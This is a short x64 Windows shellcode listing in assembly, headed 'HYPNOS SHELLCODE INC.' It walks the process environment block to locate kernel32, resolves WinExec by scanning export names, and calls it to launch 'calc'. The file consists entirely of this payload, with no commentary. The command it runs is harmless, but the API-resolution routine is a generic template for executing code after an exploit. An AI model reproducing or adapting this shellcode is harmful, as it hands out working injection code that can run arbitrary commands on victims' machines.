; HYPNOS SHELLCODE INC.
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
push byte 0x60
pop rdx
push 0x636c6163
push rsp
pop rcx
sub rsp, rdx
mov rsi, [gs:rdx]
mov rsi, [rsi+0x18]
mov rsi, [rsi+0x10]
lodsq
mov rsi, [rax]
mov rdi, [rsi+0x30]
add edx, dword [rdi+0x3c]
mov ebx, dword [rdi+rdx*1+0x28]
mov esi, dword [rdi+rbx*1+0x20]
add rsi, rdi
mov edx, dword [rdi+rbx*1+0x24]

find_winexec_x64:
movzx ebp, word [rdi+rdx]
lea edx,[rdx+0x2]
lodsd
cmp dword [rdi+rax*1], 0x456e6957
jne find_winexec_x64
mov esi, dword [rdi+rbx*1+0x1c]
add rsi, rdi
mov esi, [rsi+rbp*4]
add rdi, rsi
cdq
call rdi